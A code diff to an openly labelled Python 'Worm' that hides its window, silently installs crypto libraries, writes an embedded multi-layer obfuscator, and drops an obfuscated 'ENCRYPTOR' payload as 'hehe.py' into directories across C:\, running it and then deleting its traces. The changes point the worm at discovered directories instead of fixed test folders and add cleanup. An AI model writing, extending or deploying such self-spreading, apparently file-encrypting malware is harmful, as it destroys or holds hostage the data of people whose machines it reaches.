@@ -1,13 +1,13 @@
 import os
 os.system("pip install pypiwin32 pycryptodome cryptography > /dev/null 2>&1")
 import sys
-import shutil
 import win32con
 import win32gui
 import random
 
 ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
+FUSCATE_DIR = THIS_DIR + "\\py-fuscate.py"
 
 class Worm:
     def __init__(self):
@@ -30,10 +30,13 @@ class Worm:
         self.directories_found = True
 
     def spread(self):
+        if not os.path.exists(THIS_DIR + "\\tmp"):
+            os.mkdir(THIS_DIR + "\\tmp")  
+
         to_infect = THIS_DIR + "/tmp/to_infect.py"
         to_infect_o = THIS_DIR + "/tmp/to_infect_o.py"
 
-        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+        for target in self.target_dir_list:
             worm_poli = ""
             times = random.randrange(1, 25)
             for i in range(times):
@@ -43,33 +46,33 @@ class Worm:
             worm_poli += "\n"
             worm_poli += ENCRYPTOR
 
-            with open("to_infect.py", "w") as tf:
-                tf.write(encryptor)
+            with open(to_infect, "w") as tf:
+                tf.write(worm_poli)
 
-            
-            os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")
+            os.system(f"python.exe {FUSCATE_DIR} -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")
 
             try:
                 with open(target + "/hehe.py", "w") as f:
-                    with open("to_infect_o.py", "r") as fe:
+                    with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                 os.remove(target + "/hehe.py")
             except PermissionError:
                 pass
 
+        os.remove(to_infect)
+        os.remove(to_infect_o)
+
     def execute_worm(self):
         if not self.directories_found:
             self.find_directories()
-
         self.spread()
 
 if __name__ == "__main__":
     hide = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
-    FUSCATE = """import os, sys, subprocess, argparse, random, time, marshal, lzma, gzip, bz2, binascii, zlib, requests, tqdm, colorama
-PYTHON_VERSION = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
+    FUSCATE = """import sys,argparse,random,marshal,lzma,gzip,bz2,binascii,zlib
 def encode(source:str) -> str:
     selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
     marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
@@ -87,24 +90,19 @@ def parse_args():
         parser.print_help()
         sys.exit()
     return parser.parse_args()
-def main():
-    args = parse_args()
-    print('\t[+] encoding '.title() + args.input)
-    with tqdm.tqdm(total=args.complexity) as pbar:
-        with open(args.input) as iput:
-            for i in range(args.complexity):
-                if i == 0:
-                    encoded = encode(source=iput.read())
-                else:
-                    encoded = encode(source=encoded)
-                time.sleep(0.1)
-                pbar.update(1)
-    with open(args.output, 'w') as output:
-        output.write(encoded)
 if __name__ == '__main__':
-    main()"""
+    args = parse_args()
+    print('[+] encoding '.title() + args.input)
+    with open(args.input) as iput:
+        for i in range(args.complexity):
+            if i == 0:
+                encoded = encode(source=iput.read())
+            else:
+                encoded = encode(source=encoded)
+    with open(args.output, 'w') as output:
+        output.write(encoded)"""
 
-    with open("py_fuscate.py", "w") as f:
+    with open(FUSCATE_DIR, "w") as f:
         f.write(FUSCATE)
 
     ENCRYPTOR = """import os
@@ -131,4 +129,9 @@ if __name__ == "__main__":
 
     worm = Worm()
     worm.execute_worm()
-    os.rmdir("tmp")
+
+    try:
+        os.rmdir(THIS_DIR + "\\tmp")
+    except OSError:
+        pass
+    os.remove(FUSCATE_DIR)
